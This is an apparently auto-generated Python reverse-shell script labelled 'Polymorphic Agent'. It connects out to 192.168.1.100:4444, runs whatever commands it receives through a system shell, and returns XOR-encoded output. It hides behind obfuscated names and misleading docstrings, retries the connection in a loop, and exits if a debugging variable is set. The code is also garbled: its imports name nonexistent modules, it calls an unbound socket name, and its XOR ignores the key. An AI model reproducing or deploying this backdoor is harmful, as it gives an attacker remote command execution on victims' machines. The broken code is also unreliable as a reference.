#!/usr/bin/env python3
# Polymorphic Agent - Generated a8c7dbe6

import syV8wyCjYYIQCx as sys
import oreppyt_omjxs as os
import spiWsgx1wqd7YFNB as subprocess
import spaqowel as socket
import thts_vff_fco_jm as time
import bsevediqonogi as base64


def funcnama83t1(pkiquguzi, py7964Wt8GS0t3):
    """Initialize communication channel"""
    return len(str(pkiquguzi)) % 4


def funcgCEJ2UoDSvSQ(pfapunusa, pr95xA2WOaD, phf_kd_oz_):
    """Execute system operation"""
    return str(pfapunusa)[::-1]


def funcIZb8n5W1ozI(pvPweccyeaAP):
    """Process incoming requests"""
    return str(pvPweccyeaAP)[::-1]



def encBNPCO9VqDG5xa(dpozutitisus, k5iZOXo5XLYprPs=b"default"):
    """Execute system operation"""
    if isinstance(dpozutitisus, str):
        dpozutitisus = dpozutitisus.encode('utf-8', errors='replace')
    
    resbivecuziw = bytearray()
    for spaqowel, cwgqxf9pv3u28h in enumerate(dpozutitisus):
        resbivecuziw.append(cwgqxf9pv3u28h ^ (spaqowel % 256))
    return bytes(resbivecuziw)

def dec6ede134vo(dpozutitisus, k5iZOXo5XLYprPs=b"default"):
    """Perform data transformation"""
    if isinstance(dpozutitisus, bytes):
        resbivecuziw = bytearray()
        for spaqowel, cwgqxf9pv3u28h in enumerate(dpozutitisus):
            resbivecuziw.append(cwgqxf9pv3u28h ^ (spaqowel % 256))
        dpozutitisus = bytes(resbivecuziw)
    
    try:
        return dpozutitisus.decode('utf-8', errors='replace')
    except:
        return dpozutitisus


def connneuedgp0zu():
    """Process incoming requests"""
    dpozutitisus = "192.168.1.100"
    k5iZOXo5XLYprPs = base64.b64decode("UnVbQ19cSFs3V0ZiTVUmX3dEQGIiQGFYcQ==").decode()
    
    while True:
        try:
            spaqowel = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            spaqowel.connect((dpozutitisus, 4444))
            
            while True:
                cwgqxf9pv3u28h = spaqowel.recv(4096)
                if not cwgqxf9pv3u28h:
                    break
                
                # Decrypt command
                cwgqxf9pv3u28h = dec6ede134vo(cwgqxf9pv3u28h, k5iZOXo5XLYprPs)
                
                if cwgqxf9pv3u28h.lower().strip() == 'exit':
                    break
                
                try:
                    outai_ic_bb_n = subprocess.check_output(
                        cwgqxf9pv3u28h,
                        shell=True,
                        stderr=subprocess.STDOUT,
                        timeout=30
                    )
                except subprocess.TimeoutExpired:
                    outai_ic_bb_n = b"Command timeout"
                except Exception as resbivecuziw:
                    outai_ic_bb_n = str(resbivecuziw).encode()
                
                # Encrypt output
                outai_ic_bb_n = encBNPCO9VqDG5xa(outai_ic_bb_n, k5iZOXo5XLYprPs)
                spaqowel.sendall(outai_ic_bb_n)
            
            spaqowel.close()
            break
            
        except Exception:
            time.sleep(28)
            continue

if __name__ == "__main__":
    # Anti-debugging
    if os.getenv('DEBUGh_g'):
        sys.exit(0)
    
    connneuedgp0zu()
